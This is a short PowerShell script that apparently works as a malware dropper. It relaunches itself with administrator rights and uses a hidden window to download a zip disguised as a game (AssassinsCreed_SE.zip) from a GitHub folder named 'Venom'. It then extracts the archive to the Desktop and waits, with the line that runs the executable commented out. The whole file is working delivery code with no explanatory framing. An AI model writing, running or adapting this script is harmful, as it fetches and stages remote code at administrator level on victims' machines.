
$zipUrl = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip"
$zipFilePath = "$env:TEMP\AssassinsCreed_SE.zip"
$desktopPath = [System.Environment]::GetFolderPath("Desktop")

function Test-IsAdmin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-IsAdmin)) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -ArgumentList $arguments -Verb RunAs
    Exit
}

powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath

Expand-Archive -Path $zipFilePath -DestinationPath $desktopPath -Force

Start-Sleep -Seconds 240

#Start-Process -FilePath "$desktopPath\AssassinsCreed_SE.exe" 

exit 0
